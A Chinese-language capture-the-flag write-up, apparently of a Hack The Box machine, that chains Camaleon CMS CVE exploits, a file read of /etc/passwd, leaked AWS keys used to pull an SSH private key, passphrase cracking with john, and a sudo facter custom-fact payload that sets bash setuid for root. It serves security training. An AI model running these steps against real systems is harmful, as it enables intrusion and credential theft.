# 信息搜集

端口扫描

```aiignore
┌──(kali㉿kali)-[~]
└─$ nmap --min-rate 10000 -p- 10.129.38.199 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-11 08:46 EDT
Nmap scan report for 10.129.38.199
Host is up (8.0s latency).
Not shown: 59887 filtered tcp ports (no-response), 5646 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 33.64 seconds
```

# 漏洞利用

看一下80端口有什么

```aiignore
┌──(kali㉿kali)-[~]
└─$ curl -i 10.129.38.199
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.26.3 (Ubuntu)
Date: Mon, 11 May 2026 11:29:06 GMT
Content-Type: text/html
Content-Length: 154
Connection: keep-alive
Location: http://facts.htb/

<html>
<head><title>302 Found</title></head>
<body>
<center><h1>302 Found</h1></center>
<hr><center>nginx/1.26.3 (Ubuntu)</center>
</body>
</html>
```

在hosts中添加一下

```aiignore
┌──(kali㉿kali)-[~]
└─$ sudo sed -i '/10.129.38.199/d' /etc/hosts && echo "10.129.38.199 facts.htb" | sudo tee -a /etc/hosts
[sudo] password for kali: 
10.129.38.199 facts.htb
```

目录枚举

```aiignore
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://facts.htb/  
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://facts.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.history             (Status: 200) [Size: 11122]
/.bashrc              (Status: 200) [Size: 11119]
/.cache               (Status: 200) [Size: 11116]
/.hta                 (Status: 200) [Size: 11110]
/.cvs                 (Status: 200) [Size: 11110]
/.config              (Status: 200) [Size: 11119]
/.cvsignore           (Status: 200) [Size: 11128]
/.forward             (Status: 200) [Size: 11122]
/.bash_history        (Status: 200) [Size: 11137]
/.htaccess            (Status: 200) [Size: 11125]
/.listings            (Status: 200) [Size: 11125]
/.listing             (Status: 200) [Size: 11122]
/.htpasswd            (Status: 200) [Size: 11125]
/.mysql_history       (Status: 200) [Size: 11140]
/.passwd              (Status: 200) [Size: 11119]
/.perf                (Status: 200) [Size: 11113]
/.rhosts              (Status: 200) [Size: 11119]
/.profile             (Status: 200) [Size: 11122]
/.svn                 (Status: 200) [Size: 11110]
/.ssh                 (Status: 200) [Size: 11110]
/.subversion          (Status: 200) [Size: 11131]
/.sh_history          (Status: 200) [Size: 11131]
/.swf                 (Status: 200) [Size: 11110]
/.web                 (Status: 200) [Size: 11110]
/400                  (Status: 200) [Size: 6685]
/404                  (Status: 200) [Size: 4836]
/500                  (Status: 200) [Size: 7918]
/admin                (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]                                                          
/admin.cgi            (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]                                                          
/admin.pl             (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]                                                          
/admin.php            (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]                                                          
/ajax                 (Status: 200) [Size: 0]
/cache                (Status: 200) [Size: 11116]
/captcha              (Status: 200) [Size: 4562]
/config               (Status: 200) [Size: 11119]
/cvs                  (Status: 200) [Size: 11110]
/CVS                  (Status: 200) [Size: 11110]
/en                   (Status: 200) [Size: 11109]
/error                (Status: 500) [Size: 7918]
/forward              (Status: 200) [Size: 11122]
/history              (Status: 200) [Size: 11122]
/hta                  (Status: 200) [Size: 11110]
/htpasswd             (Status: 200) [Size: 11125]
/index                (Status: 200) [Size: 11113]
/index.html           (Status: 200) [Size: 11128]
/index.htm            (Status: 200) [Size: 11125]
/index.php            (Status: 200) [Size: 11125]
/listing              (Status: 200) [Size: 11122]
/listings             (Status: 200) [Size: 11125]
/page                 (Status: 200) [Size: 19593]
/passwd               (Status: 200) [Size: 11119]
/perf                 (Status: 200) [Size: 11113]
/post                 (Status: 200) [Size: 11308]
/profile              (Status: 200) [Size: 11122]
/robots               (Status: 200) [Size: 33]
/robots.txt           (Status: 200) [Size: 99]
/rss                  (Status: 200) [Size: 183]
/search               (Status: 200) [Size: 19187]
/sitemap              (Status: 200) [Size: 3508]
/sitemap.gz           (Status: 500) [Size: 7918]
/sitemap.xml          (Status: 200) [Size: 3508]
/ssh                  (Status: 200) [Size: 11110]
/svn                  (Status: 200) [Size: 11110]
/swf                  (Status: 200) [Size: 11110]
/up                   (Status: 200) [Size: 73]
/web                  (Status: 200) [Size: 11110]
/welcome              (Status: 200) [Size: 11966]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

看到了/admin目录，会重定向到/login页面。
可以创建账号，创建一个账号登陆进去看一下

发现使用的
Camaleon CMS.
Version 2.9.0
可以找到相关漏洞CVE-2025-2304

```aiignore
┌──(kali㉿kali)-[~]
└─$ python exp.py --url http://facts.htb --username qwe --password qwe
Exploit sucessfull. You can relogin to the user to see results
```

成功成为了管理员用户，一同找到的还有CVE-2024-46987

```aiignore
┌──(kali㉿kali)-[~]
└─$ python3 exp.py --url http://facts.htb --username qwe --password qwe --file /etc/passwd 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false
```

没找到密码，在网页中寻找到了aws的密钥

```aiignore
┌──(kali㉿kali)-[~]
└─$ aws configure
AWS Access Key ID [None]: AKIAEE17B0B2C3195070
AWS Secret Access Key [None]: eBgEyP01IRwenOZQstZ+zBK3TnHy2ByV022sZ+mb
Default region name [None]: us-east-1
Default output format [None]:
┌──(kali㉿kali)-[~]
└─$ aws s3 ls s3://internal/ --endpoint-url http://facts.htb:54321   
                           PRE .bundle/
                           PRE .cache/
                           PRE .ssh/
2026-01-08 13:45:13        220 .bash_logout
2026-01-08 13:45:13       3900 .bashrc
2026-01-08 13:47:17         20 .lesshst
2026-01-08 13:47:17        807 .profile
                                                                             
┌──(kali㉿kali)-[~]
└─$ aws s3 ls s3://internal/.ssh/ --endpoint-url http://facts.htb:54321
2026-05-11 08:43:27         82 authorized_keys
2026-05-11 08:43:27        464 id_ed25519
┌──(kali㉿kali)-[~]
└─$ aws s3 cp s3://internal/.ssh/id_ed25519 . --endpoint-url http://facts.htb:54321 
download: s3://internal/.ssh/id_ed25519 to ./id_ed25519
```

ssh登录

```aiignore
┌──(kali㉿kali)-[~]
└─$ ssh trivia@10.129.38.199 -i id_ed25519 
The authenticity of host '10.129.38.199 (10.129.38.199)' can't be established.
ED25519 key fingerprint is SHA256:fygAnw6lqDbeHg2Y7cs39viVqxkQ6XKE0gkBD95fEzA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.38.199' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_ed25519':
┌──(kali㉿kali)-[~]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt   
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragonballz      (id_ed25519)     
1g 0:00:01:10 DONE (2026-05-11 09:52) 0.01421g/s 45.47p/s 45.47c/s 45.47C/s billy1..imissu
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
┌──(kali㉿kali)-[~]
└─$ ssh trivia@10.129.38.199 -i id_ed25519                  
Enter passphrase for key 'id_ed25519': 
Last login: Wed Jan 28 16:17:19 UTC 2026 from 10.10.14.4 on ssh
Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon May 11 01:53:03 PM UTC 2026

  System load:           0.11
  Usage of /:            71.9% of 7.28GB
  Memory usage:          18%
  Swap usage:            0%
  Processes:             220
  Users logged in:       1
  IPv4 address for eth0: 10.129.38.199
  IPv6 address for eth0: dead:beef::250:56ff:feb9:82bc


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
trivia@facts:~$
```

# 权限提升

```aiignore
trivia@facts:~$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
.rb 目录中的第一个 /path/to/dir/ 文件将被执行。
如果通过 sudo 执行，则该功能由特权用户执行，因为获得的权限没有被释放。
如果涉及环境变量，必须通过 sudo VAR=value ... 传递或先导出然后 sudo -E ... 。
facter --custom-dir=/path/to/dir/ x
trivia@facts:~$ cd /tmp
trivia@facts:/tmp$ mkdir -p exp
trivia@facts:/tmp$ cat > /tmp/exp/exp.rb << 'EOF'

#!/usr/bin/env ruby

puts "custom_fact=exploited"

system("chmod +s /bin/bash")

EOF
trivia@facts:/tmp$ sudo /usr/bin/facter --custom-dir=/tmp/exp/ x
custom_fact=exploited

trivia@facts:/tmp$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1740896 Mar  5  2025 /bin/bash
trivia@facts:/tmp$ bash -p
bash-5.2# id
uid=1000(trivia) gid=1000(trivia) euid=0(root) egid=0(root) groups=0(root),1000(trivia)
```